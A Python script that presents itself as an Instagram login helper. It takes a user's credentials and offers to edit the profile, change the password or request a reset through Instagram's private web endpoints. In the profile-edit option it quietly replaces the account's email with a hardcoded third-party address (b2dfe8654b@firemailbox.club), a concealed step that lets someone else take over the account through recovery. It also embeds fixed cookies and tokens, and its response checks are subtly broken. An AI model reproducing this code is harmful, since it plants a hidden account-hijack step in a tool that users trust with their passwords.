# login.py
About instagram


import requests
from user_agent import generate_user_agent
from datetime import datetime
import pyfiglet

# = = = = = = = = = = = =

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =


logo = pyfiglet.figlet_format('login insta')
print(A+logo)
print(Z1+"___________________________")
print(Y+"by m_h8i")
print(X+"MOHAIMN ALAMERY")
print(Z1+"___________________________")

user = input(F+'username : ')
pasw = input(Z1+'password : ')
url = "https://www.instagram.com/accounts/login/ajax/"

head = {
    'accept':'*/*',
    'accept-encoding':'gzip,deflate,br',
    'accept-language':'en-US,en;q=0.9,ar;q=0.8',
    'content-length':'269',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
    'origin':'https://www.instagram.com',
    'referer':'https://www.instagram.com/',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent': generate_user_agent(),
    'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'8a8118fa7d40',
    'x-requested-with':'XMLHttpRequest',
}
time_now = int(datetime.now().timestamp())
data = {
    'username': user,
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pasw}',
    'queryParams': {},
    'optIntoOneTap': 'false'
}

login = requests.post(url,headers=head,data=data)

if 'userId' in login.text:
    co = login.cookies
    coo = co.get_dict()
    csrf = coo['csrftoken']
    cookie = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']};"
    pass
else:
    print(f'false information')
    exit()


ask = input(B+"[1] Change info \n[2] change password \n[3] rest password \n\n[+] Enter Your Option : ")

if ask == '1':
    first = input('name : ')
    usnam = input('user : ')
    biooo = input('Bioo : ')

    url2 = 'https://www.instagram.com/accounts/edit/'
    hed2 = {
        'accept':'*/*',
        'accept-encoding':'gzip,deflate,br',
        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
        'content-length':'269',
        'content-type':'application/x-www-form-urlencoded',
        'cookie': cookie,
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-fetch-dest':'empty',
        'sec-fetch-mode':'cors',
        'sec-fetch-site':'same-origin',
        'user-agent': generate_user_agent(),
        'x-csrftoken': csrf,
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'8a8118fa7d40',
        'x-requested-with':'XMLHttpRequest',
    }
    dat2 = {
        'first_name': first,
        'email': 'b2dfe8654b@firemailbox.club',
        'username': usnam,
        'phone_number': '',
        'biography': biooo,
        'external_url': '',
        'chaining_enabled': 'on'
    }
    change = requests.post(url2,headers=hed2,data=dat2)
    if '"status":"fail"' in change:
        print('Not Changed !!')
        exit()
    elif '{"status":"ok"}' in change:
        print('Changed Done')

if ask =='2':
    url3 = 'https://www.instagram.com/accounts/password/change/'
    hed3 = {
        'accept':'*/*',
        'accept-encoding':'gzip,deflate,br',
        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
        'content-length':'269',
        'content-type':'application/x-www-form-urlencoded',
        'cookie': cookie,
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-fetch-dest':'empty',
        'sec-fetch-mode':'cors',
        'sec-fetch-site':'same-origin',
        'user-agent': generate_user_agent(),
        'x-csrftoken': csrf,
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'8a8118fa7d40',
        'x-requested-with':'XMLHttpRequest',
    }
    new_pass = input('new password : ')
    dat3 = {
        'enc_old_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pasw}',
        'enc_new_password1': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{new_pass}',
        'enc_new_password2': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{new_pass}',
    }
    x = requests.post(url3,headers=hed3,data=dat3).text
    if '{"status":"ok"}' in x:
        print('done changed')
    else:
        print('some error')
        exit()

if ask == '3':
    rest = input('enter user or email : ')
    url4 = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
    hed4 = {
        'accept':'*/*',
        'accept-encoding':'gzip,deflate,br',
        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
        'content-length':'269',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-fetch-dest':'empty',
        'sec-fetch-mode':'cors',
        'sec-fetch-site':'same-origin',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'8a8118fa7d40',
        'x-requested-with':'XMLHttpRequest',
    }
    dat3 = {
        'email_or_username': rest,
        'recaptcha_challenge_field': '',
        'flow': '',
        'app_id': '',
        'source_account_id': ''
    }
    z = requests.post(url4,headers=hed4,data=dat3).text
    if 'We sent an email to' in z:
        print(f'done send rest to {rest}')
    else:
        print('error in send rest')
        exit()
